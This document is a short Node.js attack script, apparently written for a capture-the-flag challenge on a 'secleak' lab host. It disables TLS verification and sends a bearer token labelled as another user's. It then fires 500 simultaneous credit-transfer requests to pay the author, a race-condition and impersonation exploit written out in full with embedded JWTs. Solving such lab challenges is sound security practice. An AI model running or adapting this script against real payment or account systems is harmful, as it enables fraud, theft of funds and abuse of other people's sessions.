process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const axios = require('axios');

const url = 'http://secleak.secenv/api/credit';

const headers = {
    'Content-Type': 'application/json',
	
	// Mr. Short's token
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDc0ODk2MjgsIm5iZiI6MTc0NzQ4OTYyOCwianRpIjoiZjBjMDJmZWMtZTE5ZC00Yjk3LWEwZTktYTg2NTFiM2E0MmM1IiwiaWRlbnRpdHkiOnsidWlkIjo0MzksIm5pY2siOiJNci4gU2hvcnQifSwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.M-DT0gHNm66-B4eYNjW3G42vrPId7rStTUJm5BWA1hA'
    
	
	// My personal token
	// 'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDczMzY5NzAsIm5iZiI6MTc0NzMzNjk3MCwianRpIjoiYmUzYzA1N2QtNzEyNi00NmMyLWFhOWUtMjhkMDcyYWYxMGY2IiwiaWRlbnRpdHkiOnsidWlkIjo0MzksIm5pY2siOiJCbGF6ZSBQcm93bGVyIiwiY2hhbGxlbmdlIjoic2VjbGVhayJ9LCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.Ska4PsrcIbW0FYukNv9Fw4IYULE_owWT_mFLKdFb2fc'
};

const body = {
    amount: "4320",
    receiver: "Blaze Prowler"
    // receiver: "Mr. Short"
	
};

(async () => {
    const results = await Promise.allSettled(
        Array.from({ length: 500 }, () =>
            axios.post(url, body, { headers }).catch(e => e)
        )
    );

    const success = results.filter(r => r.status === 'fulfilled').length;
    const failed = results.length - success;

    console.log(`Successful transfers: ${success}`);
    console.log(`Failed transfers: ${failed}`);
})();
